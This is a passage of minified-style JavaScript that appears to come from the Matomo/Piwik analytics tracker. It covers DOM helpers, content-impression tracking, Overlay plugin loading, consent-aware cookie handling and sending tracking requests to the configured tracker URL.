      return ap(aq);
    }
    var ae = {
      htmlCollectionToArray: function (aq) {
        var ao = [],
          ap;
        if (!aq || !aq.length) {
          return ao;
        }
        for (ap = 0; ap < aq.length; ap++) {
          ao.push(aq[ap]);
        }
        return ao;
      },
      find: function (ao) {
        if (!document.querySelectorAll || !ao) {
          return [];
        }
        var ap = document.querySelectorAll(ao);
        return this.htmlCollectionToArray(ap);
      },
      findMultiple: function (aq) {
        if (!aq || !aq.length) {
          return [];
        }
        var ap, ar;
        var ao = [];
        for (ap = 0; ap < aq.length; ap++) {
          ar = this.find(aq[ap]);
          ao = ao.concat(ar);
        }
        ao = this.makeNodesUnique(ao);
        return ao;
      },
      findNodesByTagName: function (ap, ao) {
        if (!ap || !ao || !ap.getElementsByTagName) {
          return [];
        }
        var aq = ap.getElementsByTagName(ao);
        return this.htmlCollectionToArray(aq);
      },
      makeNodesUnique: function (ao) {
        var au = [].concat(ao);
        ao.sort(function (aw, av) {
          if (aw === av) {
            return 0;
          }
          var ay = M(au, aw);
          var ax = M(au, av);
          if (ay === ax) {
            return 0;
          }
          return ay > ax ? -1 : 1;
        });
        if (ao.length <= 1) {
          return ao;
        }
        var ap = 0;
        var ar = 0;
        var at = [];
        var aq;
        aq = ao[ap++];
        while (aq) {
          if (aq === ao[ap]) {
            ar = at.push(ap);
          }
          aq = ao[ap++] || null;
        }
        while (ar--) {
          ao.splice(at[ar], 1);
        }
        return ao;
      },
      getAttributeValueFromNode: function (at, aq) {
        if (!this.hasNodeAttribute(at, aq)) {
          return;
        }
        if (at && at.getAttribute) {
          return at.getAttribute(aq);
        }
        if (!at || !at.attributes) {
          return;
        }
        var ar = typeof at.attributes[aq];
        if ("undefined" === ar) {
          return;
        }
        if (at.attributes[aq].value) {
          return at.attributes[aq].value;
        }
        if (at.attributes[aq].nodeValue) {
          return at.attributes[aq].nodeValue;
        }
        var ap;
        var ao = at.attributes;
        if (!ao) {
          return;
        }
        for (ap = 0; ap < ao.length; ap++) {
          if (ao[ap].nodeName === aq) {
            return ao[ap].nodeValue;
          }
        }
        return null;
      },
      hasNodeAttributeWithValue: function (ap, ao) {
        var aq = this.getAttributeValueFromNode(ap, ao);
        return !!aq;
      },
      hasNodeAttribute: function (aq, ao) {
        if (aq && aq.hasAttribute) {
          return aq.hasAttribute(ao);
        }
        if (aq && aq.attributes) {
          var ap = typeof aq.attributes[ao];
          return "undefined" !== ap;
        }
        return false;
      },
      hasNodeCssClass: function (aq, ao) {
        if (aq && ao && aq.className) {
          var ap = typeof aq.className === "string" ? aq.className.split(" ") : [];
          if (-1 !== M(ap, ao)) {
            return true;
          }
        }
        return false;
      },
      findNodesHavingAttribute: function (at, aq, ao) {
        if (!ao) {
          ao = [];
        }
        if (!at || !aq) {
          return ao;
        }
        var ar = P(at);
        if (!ar || !ar.length) {
          return ao;
        }
        var ap, au;
        for (ap = 0; ap < ar.length; ap++) {
          au = ar[ap];
          if (this.hasNodeAttribute(au, aq)) {
            ao.push(au);
          }
          ao = this.findNodesHavingAttribute(au, aq, ao);
        }
        return ao;
      },
      findFirstNodeHavingAttribute: function (aq, ap) {
        if (!aq || !ap) {
          return;
        }
        if (this.hasNodeAttribute(aq, ap)) {
          return aq;
        }
        var ao = this.findNodesHavingAttribute(aq, ap);
        if (ao && ao.length) {
          return ao[0];
        }
      },
      findFirstNodeHavingAttributeWithValue: function (ar, aq) {
        if (!ar || !aq) {
          return;
        }
        if (this.hasNodeAttributeWithValue(ar, aq)) {
          return ar;
        }
        var ao = this.findNodesHavingAttribute(ar, aq);
        if (!ao || !ao.length) {
          return;
        }
        var ap;
        for (ap = 0; ap < ao.length; ap++) {
          if (this.getAttributeValueFromNode(ao[ap], aq)) {
            return ao[ap];
          }
        }
      },
      findNodesHavingCssClass: function (at, ar, ao) {
        if (!ao) {
          ao = [];
        }
        if (!at || !ar) {
          return ao;
        }
        if (at.getElementsByClassName) {
          var au = at.getElementsByClassName(ar);
          return this.htmlCollectionToArray(au);
        }
        var aq = P(at);
        if (!aq || !aq.length) {
          return [];
        }
        var ap, av;
        for (ap = 0; ap < aq.length; ap++) {
          av = aq[ap];
          if (this.hasNodeCssClass(av, ar)) {
            ao.push(av);
          }
          ao = this.findNodesHavingCssClass(av, ar, ao);
        }
        return ao;
      },
      findFirstNodeHavingClass: function (aq, ap) {
        if (!aq || !ap) {
          return;
        }
        if (this.hasNodeCssClass(aq, ap)) {
          return aq;
        }
        var ao = this.findNodesHavingCssClass(aq, ap);
        if (ao && ao.length) {
          return ao[0];
        }
      },
      isLinkElement: function (ap) {
        if (!ap) {
          return false;
        }
        var ao = String(ap.nodeName).toLowerCase();
        var ar = ["a", "area"];
        var aq = M(ar, ao);
        return aq !== -1;
      },
      setAnyAttribute: function (ap, ao, aq) {
        if (!ap || !ao) {
          return;
        }
        if (ap.setAttribute) {
          ap.setAttribute(ao, aq);
        } else {
          ap[ao] = aq;
        }
      }
    };
    var v = {
      CONTENT_ATTR: "data-track-content",
      CONTENT_CLASS: "piwikTrackContent",
      CONTENT_NAME_ATTR: "data-content-name",
      CONTENT_PIECE_ATTR: "data-content-piece",
      CONTENT_PIECE_CLASS: "piwikContentPiece",
      CONTENT_TARGET_ATTR: "data-content-target",
      CONTENT_TARGET_CLASS: "piwikContentTarget",
      CONTENT_IGNOREINTERACTION_ATTR: "data-content-ignoreinteraction",
      CONTENT_IGNOREINTERACTION_CLASS: "piwikContentIgnoreInteraction",
      location: undefined,
      findContentNodes: function () {
        var ap = "." + this.CONTENT_CLASS;
        var ao = "[" + this.CONTENT_ATTR + "]";
        var aq = ae.findMultiple([ap, ao]);
        return aq;
      },
      findContentNodesWithinNode: function (ar) {
        if (!ar) {
          return [];
        }
        var ap = ae.findNodesHavingCssClass(ar, this.CONTENT_CLASS);
        var ao = ae.findNodesHavingAttribute(ar, this.CONTENT_ATTR);
        if (ao && ao.length) {
          var aq;
          for (aq = 0; aq < ao.length; aq++) {
            ap.push(ao[aq]);
          }
        }
        if (ae.hasNodeAttribute(ar, this.CONTENT_ATTR)) {
          ap.push(ar);
        } else {
          if (ae.hasNodeCssClass(ar, this.CONTENT_CLASS)) {
            ap.push(ar);
          }
        }
        ap = ae.makeNodesUnique(ap);
        return ap;
      },
      findParentContentNode: function (ap) {
        if (!ap) {
          return;
        }
        var aq = ap;
        var ao = 0;
        while (aq && aq !== G && aq.parentNode) {
          if (ae.hasNodeAttribute(aq, this.CONTENT_ATTR)) {
            return aq;
          }
          if (ae.hasNodeCssClass(aq, this.CONTENT_CLASS)) {
            return aq;
          }
          aq = aq.parentNode;
          if (ao > 1000) {
            break;
          }
          ao++;
        }
      },
      findPieceNode: function (ap) {
        var ao;
        ao = ae.findFirstNodeHavingAttribute(ap, this.CONTENT_PIECE_ATTR);
        if (!ao) {
          ao = ae.findFirstNodeHavingClass(ap, this.CONTENT_PIECE_CLASS);
        }
        if (ao) {
          return ao;
        }
        return ap;
      },
      findTargetNodeNoDefault: function (ao) {
        if (!ao) {
          return;
        }
        var ap = ae.findFirstNodeHavingAttributeWithValue(ao, this.CONTENT_TARGET_ATTR);
        if (ap) {
          return ap;
        }
        ap = ae.findFirstNodeHavingAttribute(ao, this.CONTENT_TARGET_ATTR);
        if (ap) {
          return ap;
        }
        ap = ae.findFirstNodeHavingClass(ao, this.CONTENT_TARGET_CLASS);
        if (ap) {
          return ap;
        }
      },
      findTargetNode: function (ao) {
        var ap = this.findTargetNodeNoDefault(ao);
        if (ap) {
          return ap;
        }
        return ao;
      },
      findContentName: function (ap) {
        if (!ap) {
          return;
        }
        var at = ae.findFirstNodeHavingAttributeWithValue(ap, this.CONTENT_NAME_ATTR);
        if (at) {
          return ae.getAttributeValueFromNode(at, this.CONTENT_NAME_ATTR);
        }
        var ao = this.findContentPiece(ap);
        if (ao) {
          return this.removeDomainIfIsInLink(ao);
        }
        if (ae.hasNodeAttributeWithValue(ap, "title")) {
          return ae.getAttributeValueFromNode(ap, "title");
        }
        var aq = this.findPieceNode(ap);
        if (ae.hasNodeAttributeWithValue(aq, "title")) {
          return ae.getAttributeValueFromNode(aq, "title");
        }
        var ar = this.findTargetNode(ap);
        if (ae.hasNodeAttributeWithValue(ar, "title")) {
          return ae.getAttributeValueFromNode(ar, "title");
        }
      },
      findContentPiece: function (ap) {
        if (!ap) {
          return;
        }
        var ar = ae.findFirstNodeHavingAttributeWithValue(ap, this.CONTENT_PIECE_ATTR);
        if (ar) {
          return ae.getAttributeValueFromNode(ar, this.CONTENT_PIECE_ATTR);
        }
        var ao = this.findPieceNode(ap);
        var aq = this.findMediaUrlInNode(ao);
        if (aq) {
          return this.toAbsoluteUrl(aq);
        }
      },
      findContentTarget: function (aq) {
        if (!aq) {
          return;
        }
        var ar = this.findTargetNode(aq);
        if (ae.hasNodeAttributeWithValue(ar, this.CONTENT_TARGET_ATTR)) {
          return ae.getAttributeValueFromNode(ar, this.CONTENT_TARGET_ATTR);
        }
        var ap;
        if (ae.hasNodeAttributeWithValue(ar, "href")) {
          ap = ae.getAttributeValueFromNode(ar, "href");
          return this.toAbsoluteUrl(ap);
        }
        var ao = this.findPieceNode(aq);
        if (ae.hasNodeAttributeWithValue(ao, "href")) {
          ap = ae.getAttributeValueFromNode(ao, "href");
          return this.toAbsoluteUrl(ap);
        }
      },
      isSameDomain: function (ao) {
        if (!ao || !ao.indexOf) {
          return false;
        }
        if (0 === ao.indexOf(this.getLocation().origin)) {
          return true;
        }
        var ap = ao.indexOf(this.getLocation().host);
        if (8 >= ap && 0 <= ap) {
          return true;
        }
        return false;
      },
      removeDomainIfIsInLink: function (aq) {
        var ap = "^https?://[^/]+";
        var ao = "^.*//[^/]+";
        if (aq && aq.search && -1 !== aq.search(new RegExp(ap)) && this.isSameDomain(aq)) {
          aq = aq.replace(new RegExp(ao), "");
          if (!aq) {
            aq = "/";
          }
        }
        return aq;
      },
      findMediaUrlInNode: function (at) {
        if (!at) {
          return;
        }
        var aq = ["img", "embed", "video", "audio"];
        var ao = at.nodeName.toLowerCase();
        if (-1 !== M(aq, ao) && ae.findFirstNodeHavingAttributeWithValue(at, "src")) {
          var ar = ae.findFirstNodeHavingAttributeWithValue(at, "src");
          return ae.getAttributeValueFromNode(ar, "src");
        }
        if (ao === "object" && ae.hasNodeAttributeWithValue(at, "data")) {
          return ae.getAttributeValueFromNode(at, "data");
        }
        if (ao === "object") {
          var au = ae.findNodesByTagName(at, "param");
          if (au && au.length) {
            var ap;
            for (ap = 0; ap < au.length; ap++) {
              if ("movie" === ae.getAttributeValueFromNode(au[ap], "name") && ae.hasNodeAttributeWithValue(au[ap], "value")) {
                return ae.getAttributeValueFromNode(au[ap], "value");
              }
            }
          }
          var av = ae.findNodesByTagName(at, "embed");
          if (av && av.length) {
            return this.findMediaUrlInNode(av[0]);
          }
        }
      },
      trim: function (ao) {
        return a(ao);
      },
      isOrWasNodeInViewport: function (au) {
        if (!au || !au.getBoundingClientRect || au.nodeType !== 1) {
          return true;
        }
        var at = au.getBoundingClientRect();
        var ar = G.documentElement || {};
        var aq = at.top < 0;
        if (aq && au.offsetTop) {
          aq = au.offsetTop + at.height > 0;
        }
        var ap = ar.clientWidth;
        if (T.innerWidth && ap > T.innerWidth) {
          ap = T.innerWidth;
        }
        var ao = ar.clientHeight;
        if (T.innerHeight && ao > T.innerHeight) {
          ao = T.innerHeight;
        }
        return (at.bottom > 0 || aq) && at.right > 0 && at.left < ap && (at.top < ao || aq);
      },
      isNodeVisible: function (ap) {
        var ao = j(ap);
        var aq = this.isOrWasNodeInViewport(ap);
        return ao && aq;
      },
      buildInteractionRequestParams: function (ao, ap, aq, ar) {
        var at = "";
        if (ao) {
          at += "c_i=" + t(ao);
        }
        if (ap) {
          if (at) {
            at += "&";
          }
          at += "c_n=" + t(ap);
        }
        if (aq) {
          if (at) {
            at += "&";
          }
          at += "c_p=" + t(aq);
        }
        if (ar) {
          if (at) {
            at += "&";
          }
          at += "c_t=" + t(ar);
        }
        return at;
      },
      buildImpressionRequestParams: function (ao, ap, aq) {
        var ar = "c_n=" + t(ao) + "&c_p=" + t(ap);
        if (aq) {
          ar += "&c_t=" + t(aq);
        }
        return ar;
      },
      buildContentBlock: function (aq) {
        if (!aq) {
          return;
        }
        var ao = this.findContentName(aq);
        var ap = this.findContentPiece(aq);
        var ar = this.findContentTarget(aq);
        ao = this.trim(ao);
        ap = this.trim(ap);
        ar = this.trim(ar);
        return {
          name: ao || "Unknown",
          piece: ap || "Unknown",
          target: ar || ""
        };
      },
      collectContent: function (ar) {
        if (!ar || !ar.length) {
          return [];
        }
        var aq = [];
        var ao, ap;
        for (ao = 0; ao < ar.length; ao++) {
          ap = this.buildContentBlock(ar[ao]);
          if (J(ap)) {
            aq.push(ap);
          }
        }
        return aq;
      },
      setLocation: function (ao) {
        this.location = ao;
      },
      getLocation: function () {
        var ao = this.location || T.location;
        if (!ao.origin) {
          ao.origin = ao.protocol + "//" + ao.hostname + (ao.port ? ":" + ao.port : "");
        }
        return ao;
      },
      toAbsoluteUrl: function (ap) {
        if ((!ap || String(ap) !== ap) && ap !== "") {
          return ap;
        }
        if ("" === ap) {
          return this.getLocation().href;
        }
        if (ap.search(/^\/\//) !== -1) {
          return this.getLocation().protocol + ap;
        }
        if (ap.search(/:\/\//) !== -1) {
          return ap;
        }
        if (0 === ap.indexOf("#")) {
          return this.getLocation().origin + this.getLocation().pathname + ap;
        }
        if (0 === ap.indexOf("?")) {
          return this.getLocation().origin + this.getLocation().pathname + ap;
        }
        if (0 === ap.search("^[a-zA-Z]{2,11}:")) {
          return ap;
        }
        if (ap.search(/^\//) !== -1) {
          return this.getLocation().origin + ap;
        }
        var ao = "(.*/)";
        var aq = this.getLocation().origin + this.getLocation().pathname.match(new RegExp(ao))[0];
        return aq + ap;
      },
      isUrlToCurrentDomain: function (ap) {
        var aq = this.toAbsoluteUrl(ap);
        if (!aq) {
          return false;
        }
        var ao = this.getLocation().origin;
        if (ao === aq) {
          return true;
        }
        if (0 === String(aq).indexOf(ao)) {
          if (":" === String(aq).substr(ao.length, 1)) {
            return false;
          }
          return true;
        }
        return false;
      },
      setHrefAttribute: function (ap, ao) {
        if (!ap || !ao) {
          return;
        }
        ae.setAnyAttribute(ap, "href", ao);
      },
      shouldIgnoreInteraction: function (aq) {
        var ap = ae.hasNodeAttribute(aq, this.CONTENT_IGNOREINTERACTION_ATTR);
        var ao = ae.hasNodeCssClass(aq, this.CONTENT_IGNOREINTERACTION_CLASS);
        return ap || ao;
      }
    };
    function O(ap, at) {
      if (at) {
        return at;
      }
      ap = v.toAbsoluteUrl(ap);
      if (z(ap, "?")) {
        var ar = ap.indexOf("?");
        ap = ap.slice(0, ar);
      }
      if (R(ap, "matomo.php")) {
        ap = g(ap, "matomo.php".length);
      } else {
        if (R(ap, "piwik.php")) {
          ap = g(ap, "piwik.php".length);
        } else {
          if (R(ap, ".php")) {
            var ao = ap.lastIndexOf("/");
            var aq = 1;
            ap = ap.slice(0, ao + aq);
          }
        }
      }
      if (R(ap, "/js/")) {
        ap = g(ap, "js/".length);
      }
      return ap;
    }
    function N(av) {
      var ax = "Piwik_Overlay";
      var ap = new RegExp("index\\.php\\?module=Overlay&action=startOverlaySession&idSite=([0-9]+)&period=([^&]+)&date=([^&]+)(&segment=.*)?$");
      var aq = ap.exec(G.referrer);
      if (aq) {
        var at = aq[1];
        if (at !== String(av)) {
          return false;
        }
        var au = aq[2],
          ao = aq[3],
          ar = aq[4];
        if (!ar) {
          ar = "";
        } else {
          if (ar.indexOf("&segment=") === 0) {
            ar = ar.substr("&segment=".length);
          }
        }
        T.name = ax + "###" + au + "###" + ao + "###" + ar;
      }
      var aw = T.name.split("###");
      return aw.length === 4 && aw[0] === ax;
    }
    function Z(ap, aw, ar) {
      var av = T.name.split("###"),
        au = av[1],
        ao = av[2],
        at = av[3],
        aq = O(ap, aw);
      o(aq + "plugins/Overlay/client/client.js?v=1", function () {
        Piwik_Overlay_Client.initialize(aq, ar, au, ao, at);
      });
    }
    function u() {
      var aq;
      try {
        aq = T.frameElement;
      } catch (ap) {
        return true;
      }
      if (J(aq)) {
        return aq && String(aq.nodeName).toLowerCase() === "iframe" ? true : false;
      }
      try {
        return T.self !== T.top;
      } catch (ao) {
        return true;
      }
    }
    function Q(ce, b9) {
      var bI = this,
        be = "mtm_consent",
        cD = "mtm_cookie_consent",
        cN = "mtm_consent_removed",
        b4 = aa(G.domain, T.location.href, K()),
        cW = L(b4[0]),
        bN = p(b4[1]),
        bn = p(b4[2]),
        cU = false,
        ci = "GET",
        dc = ci,
        aI = "application/x-www-form-urlencoded; charset=UTF-8",
        cx = aI,
        aE = ce || "",
        bH = "",
        c1 = "",
        b6 = b9 || "",
        by = "",
        bO = "",
        a5,
        bj = "",
        c8 = ["7z", "aac", "apk", "arc", "arj", "asf", "asx", "avi", "azw3", "bin", "csv", "deb", "dmg", "doc", "docx", "epub", "exe", "flv", "gif", "gz", "gzip", "hqx", "ibooks", "jar", "jpg", "jpeg", "js", "mobi", "mp2", "mp3", "mp4", "mpg", "mpeg", "mov", "movie", "msi", "msp", "odb", "odf", "odg", "ods", "odt", "ogg", "ogv", "pdf", "phps", "png", "ppt", "pptx", "qt", "qtm", "ra", "ram", "rar", "rpm", "sea", "sit", "tar", "tbz", "tbz2", "bz", "bz2", "tgz", "torrent", "txt", "wav", "wma", "wmv", "wpd", "xls", "xlsx", "xml", "z", "zip"],
        ay = [cW],
        bz = [],
        bL = [],
        a9 = [],
        bJ = 500,
        cY = false,
        cJ,
        a6,
        bR,
        c9 = 1800,
        bP,
        ao,
        cr = ["pk_campaign", "piwik_campaign", "utm_campaign", "utm_source", "utm_medium"],
        bG = ["pk_kwd", "piwik_kwd", "utm_term"],
        bk = "_pk_",
        av = "pk_vid",
        a0 = 180,
        cZ,
        bp,
        bS = false,
        bl = false,
        cR,
        bf,
        bv,
        cK = 33955200000,
        cp = 1800000,
        c7 = 15768000000,
        a3 = true,
        cn = 0,
        bQ = false,
        aR = false,
        cb,
        bW = {},
        cm = {},
        bm = {},
        bt = 200,
        c2 = {},
        da = {},
        ca = [],
        cf = false,
        cB = false,
        ap = false,
        db = false,
        cO = false,
        aO = false,
        bd = u(),
        cT = null,
        c0 = null,
        cc,
        aS,
        bA,
        b7 = am,
        bo,
        aL,
        cs = 0,
        bu = ["id", "ses", "cvar", "ref"],
        cA = false,
        bB = null,
        cL = [],
        ax = U++,
        aw = false;
      try {
        bj = G.title;
      } catch (cy) {
        bj = "";
      }
      function dg(ds, dq, dp, dr, dn, dm) {
        if (bl) {
          return;
        }
        var dl;
        if (dp) {
          dl = new Date();
          dl.setTime(dl.getTime() + dp);
        }
        G.cookie = ds + "=" + t(dq) + (dp ? ";expires=" + dl.toGMTString() : "") + ";path=" + (dr || "/") + (dn ? ";domain=" + dn : "") + (dm ? ";secure" : "") + ";SameSite=Lax";
      }
      function aD(dn) {
        if (bl) {
          return 0;
        }
        var dl = new RegExp("(^|;)[ ]*" + dn + "=([^;]*)"),
          dm = dl.exec(G.cookie);
        return dm ? S(dm[2]) : 0;
      }
      bB = !aD(cN);
      function b2(dl) {
        var dm;
        dl = k(dl, av);
        if (bP) {
          dm = new RegExp("#.*");
          return dl.replace(dm, "");
        }
        return dl;
      }
      function bV(dn, dl) {
        var dp = s(dl),
          dm;
        if (dp) {
          return dl;
        }
        if (dl.slice(0, 1) === "/") {
          return s(dn) + "://" + d(dn) + dl;
        }
        dn = b2(dn);
        dm = dn.indexOf("?");
        if (dm >= 0) {
          dn = dn.slice(0, dm);
        }
        dm = dn.lastIndexOf("/");
        if (dm !== dn.length - 1) {
          dn = dn.slice(0, dm + 1);
        }
        return dn + dl;
      }
      function cH(dn, dl) {
        var dm;
        dn = String(dn).toLowerCase();
        dl = String(dl).toLowerCase();
        if (dn === dl) {
          return true;
        }
        if (dl.slice(0, 1) === ".") {
          if (dn === dl.slice(1)) {
            return true;
          }
          dm = dn.length - dl.length;
          if (dm > 0 && dn.slice(dm) === dl) {
            return true;
          }
        }
        return false;
      }
      function cl(dl) {
        var dm = document.createElement("a");
        if (dl.indexOf("//") !== 0 && dl.indexOf("http") !== 0) {
          if (dl.indexOf("*") === 0) {
            dl = dl.substr(1);
          }
          if (dl.indexOf(".") === 0) {
            dl = dl.substr(1);
          }
          dl = "http://" + dl;
        }
        dm.href = v.toAbsoluteUrl(dl);
        if (dm.pathname) {
          return dm.pathname;
        }
        return "";
      }
      function a4(dm, dl) {
        if (!aj(dl, "/")) {
          dl = "/" + dl;
        }
        if (!aj(dm, "/")) {
          dm = "/" + dm;
        }
        var dn = dl === "/" || dl === "/*";
        if (dn) {
          return true;
        }
        if (dm === dl) {
          return true;
        }
        dl = String(dl).toLowerCase();
        dm = String(dm).toLowerCase();
        if (R(dl, "*")) {
          dl = dl.slice(0, -1);
          dn = !dl || dl === "/";
          if (dn) {
            return true;
          }
          if (dm === dl) {
            return true;
          }
          return dm.indexOf(dl) === 0;
        }
        if (!R(dm, "/")) {
          dm += "/";
        }
        if (!R(dl, "/")) {
          dl += "/";
        }
        return dm.indexOf(dl) === 0;
      }
      function ar(dq, ds) {
        var dm, dl, dn, dp, dr;
        for (dm = 0; dm < ay.length; dm++) {
          dp = L(ay[dm]);
          dr = cl(ay[dm]);
          if (cH(dq, dp) && a4(ds, dr)) {
            return true;
          }
        }
        return false;
      }
      function aW(dp) {
        var dm, dl, dn;
        for (dm = 0; dm < ay.length; dm++) {
          dl = L(ay[dm].toLowerCase());
          if (dp === dl) {
            return true;
          }
          if (dl.slice(0, 1) === ".") {
            if (dp === dl.slice(1)) {
              return true;
            }
            dn = dp.length - dl.length;
            if (dn > 0 && dp.slice(dn) === dl) {
              return true;
            }
          }
        }
        return false;
      }
      function cq(dl, dn) {
        dl = dl.replace("send_image=0", "send_image=1");
        var dm = new Image(1, 1);
        dm.onload = function () {
          E = 0;
          if (typeof dn === "function") {
            dn({
              request: dl,
              trackerUrl: aE,
              success: true
            });
          }
        };
        dm.onerror = function () {
          if (typeof dn === "function") {
            dn({
              request: dl,
              trackerUrl: aE,
              success: false
            });
          }
        };
        dm.src = aE + (aE.indexOf("?") < 0 ? "?" : "&") + dl;
      }
      function cE(dl) {
        if (dc === "POST") {
          return true;
        }
        return dl && (dl.length > 2000 || dl.indexOf('{"requests"') === 0);
      }
      function aK() {
        return "object" === typeof h && "function" === typeof h.sendBeacon && "function" === typeof Blob;
      }
      function a7(dq, dt, ds) {
        var dn = aK();
        if (!dn) {
          return false;
        }
        var dp = {
          type: "application/x-www-form-urlencoded; charset=UTF-8"
        };
        var du = false;
        var dm = aE;
        try {
          var dl = new Blob([dq], dp);
          if (ds && !cE(dq)) {
            dl = new Blob([], dp);
            dm = dm + (dm.indexOf("?") < 0 ? "?" : "&") + dq;
          }
          du = h.sendBeacon(dm, dl);
        } catch (dr) {
          return false;
        }
        if (du && typeof dt === "function") {
          dt({
            request: dq,
            trackerUrl: aE,
            success: true,
            isSendBeacon: true
          });
        }
        return du;
      }
      function c6(dm, dn, dl) {
        if (!J(dl) || null === dl) {
          dl = true;
        }
        if (m && a7(dm, dn, dl)) {
          return;
        }
        setTimeout(function () {
          if (m && a7(dm, dn, dl)) {
            return;
          }
          var dr;
          try {
            var dq = T.XMLHttpRequest ? new T.XMLHttpRequest() : T.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : null;
            dq.open("POST", aE, true);
            dq.onreadystatechange = function () {
              if (this.readyState === 4 && !(this.status >= 200 && this.status < 300)) {
                var ds = m && a7(dm, dn, dl);
                if (!ds && dl) {
                  cq(dm, dn);
                } else {
                  if (typeof dn === "function") {
                    dn({
                      request: dm,
                      trackerUrl: aE,
                      success: false,
                      xhr: this
                    });
                  }
                }
              } else {
                if (this.readyState === 4 && typeof dn === "function") {
                  dn({
                    request: dm,
                    trackerUrl: aE,
                    success: true,
                    xhr: this
                  });
                }
              }
            };
            dq.setRequestHeader("Content-Type", cx);
            dq.withCredentials = true;
            dq.send(dm);
          } catch (dp) {
            dr = m && a7(dm, dn, dl);
            if (!dr && dl) {
              cq(dm, dn);
            } else {
              if (typeof dn === "function") {
                dn({
                  request: dm,
                  trackerUrl: aE,
                  success: false
                });
              }
            }
          }
        }, 50);
      }
      function cg(dm) {
        var dl = new Date();
        var dn = dl.getTime() + dm;
        if (!r || dn > r) {
          r = dn;
        }
      }
      function co(dl) {
        if (cc || !a6 || !bB) {
          return;
        }
        cc = setTimeout(function dm() {
          cc = null;
          if (!bd) {
            bd = !G.hasFocus || G.hasFocus();
          }
          if (!bd) {
            co(a6);
            return;
          }
          if (bR()) {
            return;
          }
          var dn = new Date(),
            dp = a6 - (dn.getTime() - c0);
          dp = Math.min(a6, dp);
          co(dp);
        }, dl || a6);
      }
      function bK() {
        if (!cc) {
          return;
        }
        clearTimeout(cc);
        cc = null;
      }
      function bb() {
        bd = true;
        cT = new Date().getTime();
      }
      function df() {
        var dl = new Date().getTime();
        return !cT || dl - cT > a6;
      }
      function az() {
        if (df()) {
          bR();
        }
        bK();
      }
      function di() {
        if (aO || !a6) {
          return;
        }
        aO = true;
        an(T, "focus", bb);
        an(T, "blur", az);
        ab++;
        e.addPlugin("HeartBeat" + ab, {
          unload: function () {
            if (aO && df()) {
              bR();
            }
          }
        });
      }
      function cC(dq) {
        var dm = new Date();
        var dl = dm.getTime();
        c0 = dl;
        if (cB && dl < cB) {
          var dn = cB - dl;
          setTimeout(dq, dn);
          cg(dn + 50);
          cB += 50;
          return;
        }
        if (cB === false) {
          var dp = 800;
          cB = dl + dp;
        }
        dq();
      }
      function aP() {
        if (aD(cN)) {
          bB = false;
        } else {
          if (aD(be)) {
            bB = true;
          }
        }
      }
      function bF(dm, dl, dn) {
        aP();
        if (!bB) {
          cL.push(dm);
          return;
        }
        aw = true;
        if (!cR && dm) {
          if (cA && bB) {
            dm += "&consent=1";
          }
          cC(function () {
            if (cY && a7(dm, dn, true)) {
              cg(100);
              return;
            }
            if (cE(dm)) {
              c6(dm, dn);
            } else {
              cq(dm, dn);
            }
            cg(dl);
          });
        }
        if (!aO) {
          di();
        }
      }
      function ck(dl) {
        if (cR) {
          return false;
        }
        return dl && dl.length;
      }
      function c5(dl, dq) {
        if (!dq || dq >= dl.length) {
          return [dl];
        }
        var dm = 0;
        var dn = dl.length;
        var dp = [];
        for (dm; dm < dn; dm += dq) {
          dp.push(dl.slice(dm, dm + dq));
        }
        return dp;
      }
      function dh(dm, dl) {
        if (!ck(dm)) {
          return;
        }
        if (!bB) {
          cL.push(dm);
          return;
        }
        aw = true;
        cC(function () {
          var dq = c5(dm, 50);
          var dn = 0,
            dp;
          for (dn; dn < dq.length; dn++) {
            dp = '{"requests":["?' + dq[dn].join('","?') + '"]}';
            if (cY && a7(dp, null, false)) {
              cg(100);
            } else {
              c6(dp, null, false);
            }
          }
          cg(dl);
        });
      }
      function aU(dl) {
        return bk + dl + "." + b6 + "." + bo;
      }
      function bY(dn, dm, dl) {
        dg(dn, "", -86400, dm, dl);
      }
      function b5() {
        if (bl) {
          return "0";
        }
        if (!J(T.showModalDialog) && J(h.cookieEnabled)) {
          return h.cookieEnabled ? "1" : "0";
        }
        var dl = bk + "testcookie";
        dg(dl, "1", undefined, bp, cZ, bS);
        var dm = aD(dl) === "1" ? "1" : "0";
        bY(dl);
        return dm;
      }
      function bi() {
        bo = b7((cZ || cW) + (bp || "/")).slice(0, 4);
      }
      function cI() {
        if (J(da.res)) {
          return da;
        }
        var dm,
          dp,
          dq = {
            pdf: "application/pdf",
            qt: "video/quicktime",
            realp: "audio/x-pn-realaudio-plugin",
            wma: "application/x-mplayer2",
            dir: "application/x-director",
            fla: "application/x-shockwave-flash",
            java: "application/x-java-vm",
            gears: "application/x-googlegears",
            ag: "application/x-silverlight"
          };
        if (!new RegExp("MSIE").test(h.userAgent)) {
          if (h.mimeTypes && h.mimeTypes.length) {
            for (dm in dq) {
              if (Object.prototype.hasOwnProperty.call(dq, dm)) {
                dp = h.mimeTypes[dq[dm]];
                da[dm] = dp && dp.enabledPlugin ? "1" : "0";
              }
            }
          }
          if (!new RegExp("Edge[ /](\\d+[\\.\\d]+)").test(h.userAgent) && typeof navigator.javaEnabled !== "unknown" && J(h.javaEnabled) && h.javaEnabled()) {
            da.java = "1";
          }
          if (A(T.GearsFactory)) {
            da.gears = "1";
          }
          if (!J(T.showModalDialog) && J(h.cookieEnabled)) {
            da.cookie = h.cookieEnabled ? "1" : "0";
          } else {
            da.cookie = b5();
          }
        }
        var dn = parseInt(X.width, 10);
        var dl = parseInt(X.height, 10);
        da.res = parseInt(dn, 10) + "x" + parseInt(dl, 10);
        return da;
      }
      function bX() {
        var dm = aU("cvar"),
          dl = aD(dm);
        if (dl.length) {
          dl = JSON_PIWIK.parse(dl);
          if (W(dl)) {
            return dl;
          }
        }
        return {};
      }
      function cF() {
        if (aR === false) {
          aR = bX();
        }
      }
      function cS() {
        var dl = cI();
        return b7((h.userAgent || "") + (h.platform || "") + JSON_PIWIK.stringify(dl) + new Date().getTime() + Math.random()).slice(0, 16);
      }
      function aA() {
        var dl = cI();
        return b7((h.userAgent || "") + (h.platform || "") + JSON_PIWIK.stringify(dl)).slice(0, 6);
      }
      function bg() {
        return Math.floor(new Date().getTime() / 1000);
      }
      function aJ() {
        var dm = bg();
        var dn = aA();
        var dl = String(dm) + dn;
        return dl;
      }
      function c4(dn) {
        dn = String(dn);
        var dr = aA();
        var dp = dr.length;
        var dq = dn.substr(-1 * dp, dp);
        var dm = parseInt(dn.substr(0, dn.length - dp), 10);
        if (dm && dq && dq === dr) {
          var dl = bg();
          if (a0 <= 0) {
            return true;
          }
          if (dl >= dm && dl <= dm + a0) {
            return true;
          }
        }
        return false;
      }
